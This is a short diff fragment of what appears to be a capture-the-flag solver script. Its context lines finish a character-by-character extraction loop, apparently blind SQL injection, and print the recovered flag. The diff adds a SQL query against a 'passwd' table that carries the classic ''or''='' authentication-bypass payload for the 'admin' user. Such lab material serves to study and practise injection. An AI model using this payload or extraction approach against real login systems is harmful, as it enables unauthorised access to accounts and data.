@@ -25,3 +25,6 @@ for i in range(1,100):
 	result = result + chr(mid)
 	print(result)
 print("flag: " ,result)
+
+
+select count(id) from passwd where user = 'admin' and pass = ''or''='';
